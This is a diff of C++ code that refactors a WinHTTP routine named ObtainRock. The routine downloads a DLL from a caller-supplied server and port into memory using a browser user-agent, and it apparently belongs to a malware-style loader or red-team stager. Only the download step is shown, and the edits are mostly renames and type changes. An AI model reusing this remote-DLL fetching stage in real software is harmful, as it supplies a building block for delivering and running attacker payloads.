@@ -1,6 +1,6 @@
 #include <winhttpapi.h>
 
-void ErrorCallback(const char* msg, DWORD status, const std::vector<HANDLE> openHandles){
+VOID ErrorCallbackHTTP(const char* msg, DWORD status, const std::vector<HANDLE> openHandles){
     printf("%s - %s: %d\n", err, msg, status);
     for (auto handle : openHandles) {
         if (handle != NULL) {
@@ -11,7 +11,7 @@ void ErrorCallback(const char* msg, DWORD status, const std::vector<HANDLE> open
     exit(EXIT_FAILURE);
 }
 
-char* ObtainRock(LPCWSTR server, DWORD port, LPCWSTR dll){
+char* ObtainRock(char* server, DWORD port, char* dll){
     std::vector<unsigned char> buffer;
     std::vector<HANDLE> openHandles;
 
@@ -28,36 +28,41 @@ char* ObtainRock(LPCWSTR server, DWORD port, LPCWSTR dll){
     HINTERNET hSession = NULL;
     HINTERNET hConnect = NULL;
     HINTERNET hRequest = NULL;
+
+    wchar_t* w_server = ConvertCharToWideChar(server);
+    wchar_t* w_dll = ConvertCharToWideChar(dll);
     
     printf("%s - Establishing the connection to the server\n", info);
 
     hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if(hSession == NULL){
-        ErrorCallback("Error getting http session", GetLastError(), openHandles);
+        ErrorCallbackHTTP("Error getting http session", GetLastError(), openHandles);
     }
 
     openHandles.push_back(hSession);
 
-    hConnect = WinHttpConnect(hSession, server, port, 0);
+    hConnect = WinHttpConnect(hSession, w_server, port, 0);
     if (hConnect == NULL) {
-        ErrorCallback("Error connecting to the server", GetLastError(), openHandles);
+        ErrorCallbackHTTP("Error connecting to the server", GetLastError(), openHandles);
     }
+    delete[] w_server;
 
     openHandles.push_back(hConnect);
 
-    hRequest= WinHttpOpenRequest(hConnect, L"GET", dll, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+    hRequest= WinHttpOpenRequest(hConnect, L"GET", w_dll, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
     if (hRequest == NULL) {
-        ErrorCallback("Error crafting the request", GetLastError(), openHandles);
+        ErrorCallbackHTTP("Error crafting the request", GetLastError(), openHandles);
     }
+    delete[] w_dll;
 
     openHandles.push_back(hRequest);
 
     if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
-        ErrorCallback("Error sending the request", GetLastError(), openHandles);
+        ErrorCallbackHTTP("Error sending the request", GetLastError(), openHandles);
     }
 
     if (!WinHttpReceiveResponse(hRequest, NULL)) {
-        ErrorCallback("Error receiving the response", GetLastError(), openHandles);
+        ErrorCallbackHTTP("Error receiving the response", GetLastError(), openHandles);
     }
 
     do {
@@ -67,28 +72,28 @@ char* ObtainRock(LPCWSTR server, DWORD port, LPCWSTR dll){
         dSize = 0;
         
         if (!WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &statusCode, &statusCodeSize, NULL)) {
-            ErrorCallback("Error in WinHttpQueryHeaders", GetLastError(), openHandles);
+            ErrorCallbackHTTP("Error in WinHttpQueryHeaders", GetLastError(), openHandles);
         }
 
         if (statusCode != 200) {
-            ErrorCallback("DLL not found in the server", -1, openHandles);
+            ErrorCallbackHTTP("DLL not found in the server", -1, openHandles);
         }
 
         if (!WinHttpQueryDataAvailable(hRequest, &dSize)){
-            ErrorCallback("Error in WinHttpQueryDataAvailable", GetLastError(), openHandles);
+            ErrorCallbackHTTP("Error in WinHttpQueryDataAvailable", GetLastError(), openHandles);
         }
                 
         
         tmpBuffer = new char[dSize + 1];
 
         if(!tmpBuffer){
-            ErrorCallback("Error allocating memory for the tmpBuffer", -1, openHandles);
+            ErrorCallbackHTTP("Error allocating memory for the tmpBuffer", -1, openHandles);
         }
 
         ZeroMemory(tmpBuffer, dSize + 1);
 
         if (!WinHttpReadData(hRequest, (LPVOID)tmpBuffer, dSize, &bytesRead)) {
-            ErrorCallback("Error reading HTTP data", GetLastError(), openHandles);
+            ErrorCallbackHTTP("Error reading HTTP data", GetLastError(), openHandles);
         }
 
         buffer.insert(buffer.end(), tmpBuffer, tmpBuffer + bytesRead);
@@ -98,10 +103,10 @@ char* ObtainRock(LPCWSTR server, DWORD port, LPCWSTR dll){
     while(dSize > 0);
 
     if(buffer.empty() == TRUE){
-        ErrorCallback("Error reading HTTP data, DLL readed is empty", -1, openHandles);
+        ErrorCallbackHTTP("Error reading HTTP data, DLL readed is empty", -1, openHandles);
     }
 
-    printf("%s - DLL obtained correctly\n", info);
+    printf("\t%s - %s obtained correctly\n", ok, dll);
 
     WinHttpCloseHandle(hRequest);
     WinHttpCloseHandle(hConnect);
@@ -109,7 +114,7 @@ char* ObtainRock(LPCWSTR server, DWORD port, LPCWSTR dll){
 
     bSize = buffer.size();
     char* DLL = (char*)malloc(bSize);
-    for (size_t i = 0; i < buffer.size(); i++) {
+    for (SIZE_T i = 0; i < buffer.size(); i++) {
         DLL[i] = buffer[i];
     }
 
